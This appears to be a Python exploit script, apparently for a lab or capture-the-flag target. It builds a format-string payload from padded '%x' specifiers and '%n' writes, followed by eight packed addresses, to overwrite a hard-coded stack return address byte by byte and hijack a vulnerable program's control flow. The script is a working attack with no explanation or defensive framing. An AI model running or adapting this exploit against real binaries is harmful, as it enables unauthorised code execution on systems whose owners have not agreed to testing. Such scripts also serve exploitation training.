#!/usr/bin/env python3

import sys
from struct import pack
import subprocess
import os

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def main():
  # <--
  # [LOCAL ARGS ...] [RET] [BUF] ...

  stack_ret_addr = 0x7fffffffd838
  # stack_ret_addr = 0

  payload = b"A" * 8

  payload += b"%1$.142x"
  payload += b"%31$n   "  # 0

  payload += b"%1$.120x"
  payload += b"%32$n   "  # 1

  payload += b"%1$.43x "
  payload += b"%33$n   "  # 2

  payload += b"%1$.189x"
  payload += b"%34$n   "  # 3

  payload += b"%1$.253x"
  payload += b"%35$n   "  # 4


  payload += b"%1$.253x"
  payload += b"%36$n   "  # 5

  payload += b"%1$.253x"
  payload += b"%37$n   "  # 6

  payload += b"%1$.253x"
  payload += b"%38$n   "  # 7

  payload = payload.ljust(8 + 8 * 8 + 8 * 8)

  payload += dq(stack_ret_addr)
  payload += dq(stack_ret_addr + 1)
  payload += dq(stack_ret_addr + 2)
  payload += dq(stack_ret_addr + 3)
  payload += dq(stack_ret_addr + 4)
  payload += dq(stack_ret_addr + 5)
  payload += dq(stack_ret_addr + 6)
  payload += dq(stack_ret_addr + 7)

  sys.stdout.buffer.write(payload)

if __name__ == "__main__":
  main()
